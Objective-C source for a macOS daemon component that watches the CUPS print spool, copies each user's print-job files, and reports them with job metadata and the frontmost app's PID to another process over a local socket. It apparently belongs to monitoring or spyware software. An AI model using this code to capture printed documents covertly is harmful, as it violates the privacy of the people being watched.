//
//  PrinterFileMonitor.m
//  blbld
//
//  Created by Makara Khloth on 10/26/16.
//
//

#import "PrinterFileMonitor.h"

#import "blbldUtils.h"
#import "SocketIPCSender.h"
#import "DaemonPrivateHome.h"
#import "DefStd.h"

#define kDefaultPrinterFile      @"/private/var/spool/cups/"
#define kDefaultPrinterCache     @"/private/var/spool/cups/cache/job.cache"

@implementation PrinterFileMonitor

@synthesize mPrinterFilePath;

- (instancetype) initWithPrinterFilePath:(NSString *)aPath {
    self = [super init];
    if (self) {
        mPrinterFilePath = [aPath retain];
        mQueue = [[NSOperationQueue alloc] init];
    }
    return self;
}

- (void) startCapture {
    DLog(@"startCapture printer files");
    [self watchThisPaths:[NSArray arrayWithObjects:kDefaultPrinterFile, nil]];
}

- (void) stopCapture {
    DLog(@"stopCapture printer files");
    if (mStream != nil) {
        FSEventStreamUnscheduleFromRunLoop(mStream, CFRunLoopGetCurrent(), kCFRunLoopDefaultMode);
        FSEventStreamStop(mStream);
        mStream = nil;
    }
}

#pragma mark - Printer watch paths

- (void) watchThisPaths:(NSArray *) aFileInputPaths {
    FSEventStreamContext context;
    context.info    = (__bridge void *)(self);
    context.version = 0;
    context.retain  = NULL;
    context.release = NULL;
    context.copyDescription = NULL;
    
    if (mStream != nil) {
        FSEventStreamUnscheduleFromRunLoop(mStream, CFRunLoopGetCurrent(), kCFRunLoopDefaultMode);
        FSEventStreamStop(mStream);
    }
    
    if (aFileInputPaths.count > 0) {
        mStream = FSEventStreamCreate(NULL,
                                      &printer_FileChangeEvent,
                                      &context,
                                      (__bridge CFArrayRef) aFileInputPaths,
                                      kFSEventStreamEventIdSinceNow,
                                      0.5,
                                      kFSEventStreamCreateFlagWatchRoot | kFSEventStreamCreateFlagUseCFTypes | kFSEventStreamCreateFlagFileEvents
                                      );
        
        FSEventStreamScheduleWithRunLoop(mStream, CFRunLoopGetCurrent(), kCFRunLoopDefaultMode);
        FSEventStreamStart(mStream);
        
        DLog(@"Watching paths : %@", aFileInputPaths);
    }
}

void printer_FileChangeEvent(ConstFSEventStreamRef streamRef,
                             void* callBackInfo,
                             size_t numEvents,
                             void* eventPaths,
                             const FSEventStreamEventFlags eventFlags[],
                             const FSEventStreamEventId eventIds[]) {
    
    NSArray *paths = (__bridge NSArray*)eventPaths;
    DLog(@"Print job file paths : %@", paths);
    
    for (int i = 0; i < [paths count]; i++ ) {
        
        NSString *filePath = [NSString stringWithFormat:@"%@", [paths objectAtIndex:i]];
        NSString *fileName = [filePath lastPathComponent];
        
        if ([fileName hasPrefix:@"d"]) {
            PrinterFileMonitor *myself = (PrinterFileMonitor *)callBackInfo;
            [myself printerFileChanged:filePath];
        } else if ([filePath isEqualToString:kDefaultPrinterCache]) {
            DLog(@"NOW JOB CACHE UPDATE");
        }
    }
}

- (void) printerFileChanged: (NSString *) aFilePath {
    NSString *fileName = [aFilePath lastPathComponent];
    NSString *seqID = [fileName stringByReplacingOccurrencesOfString:@"d" withString:@""];
    seqID = [[seqID componentsSeparatedByString:@"-"] firstObject];
    DLog(@"mPrinterJobID : %d, seqID : %@", (unsigned int)mPrinterJobID, seqID);
    if (mPrinterJobID < seqID.integerValue) {
        mPrinterJobID = seqID.integerValue;
        
        pid_t frontmostPID = [[[NSWorkspace sharedWorkspace] frontmostApplication] processIdentifier];  // Capture frontmost pid for block
        NSUInteger jobID = seqID.integerValue; // Capture seqID for block
        NSBlockOperation *blockOperation = [NSBlockOperation blockOperationWithBlock:^{
            NSFileManager *fileManager = [NSFileManager defaultManager];
            NSString *copyPath = [self.mPrinterFilePath stringByAppendingString:fileName];
            NSError *error = nil;
            [fileManager copyItemAtPath:aFilePath toPath:copyPath error:&error];
            if (!error) {
                NSDate *start = [NSDate date];
                while ([[NSDate date] timeIntervalSinceDate:start] < 10 * 60) { // Delay for 10 minutes
                    
                    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
                    
                    NSString *jobCacheContent = [[[NSString alloc] initWithContentsOfFile:kDefaultPrinterCache encoding:NSUTF8StringEncoding error:&error] autorelease];
                    //DLog(@"jobID: %d, jobCacheContent : %@", (unsigned int)jobID, jobCacheContent);
                    if (!error) {
                        NSString *pjCache = [self parsePrintJobCacheContent:jobCacheContent ID:jobID];
                        DLog(@"pjCache : %@", pjCache);
                        if (pjCache) {
                            DLog(@"Capture printer job, jobID : %d, frontmostPID : %d", (unsigned int)jobID, frontmostPID);
                            [DaemonPrivateHome changeOwner:[blbldUtils userLogonName] path:copyPath];
                            [DaemonPrivateHome changePermission:@"766" path:copyPath];
                            NSNumber *pid = [NSNumber numberWithInt:frontmostPID];
                            NSNumber *pjID = [NSNumber numberWithUnsignedInteger:jobID];
                            [self capturePrinterJobFilePath:copyPath cache:pjCache ID:pjID frontmostPID:pid];
                            
                            break;
                        }
                    }
                    
                    [pool drain];
                    
                    [NSThread sleepForTimeInterval:1.0];
                }
            }
        }];
        
        [mQueue addOperation:blockOperation];
    }
}

- (NSString *) parsePrintJobCacheContent: (NSString *) aCacheContent ID: (NSUInteger) aJobID {
    NSString *jobCache  = nil;
    NSString *delimter1 = [NSString stringWithFormat:@"<Job %d>", (unsigned int)aJobID];
    NSString *delimter2 = @"</Job>";
    
    NSArray *contentComponents = [aCacheContent componentsSeparatedByString:delimter1];
    if (contentComponents.count > 1) {
        NSString *subcontent = [contentComponents objectAtIndex:1];
        jobCache = [[subcontent componentsSeparatedByString:delimter2] firstObject];
    }
    
    return jobCache;
}

- (void) capturePrinterJobFilePath: (NSString *) aFilePath cache: (NSString *) aCache ID: (NSNumber *) aID frontmostPID : (NSNumber *) aPID{
    /*
     Message port cannot send data from daemon to user app
     */
    NSDictionary *printerJob = [NSDictionary dictionaryWithObjectsAndKeys:aFilePath, @"PJFile", aCache, @"PJCache", aID, @"PJID", aPID, @"PID", nil];
    SocketIPCSender *sender = [[SocketIPCSender alloc] initWithPortNumber:55501 andAddress:kLocalHostIP];
    [sender writeDataToSocket:[NSArchiver archivedDataWithRootObject:printerJob]];
    [sender release];
}

- (void) dealloc {
    [self stopCapture];
    
    [mQueue release];
    [mPrinterFilePath release];
    
    [super dealloc];
}

@end
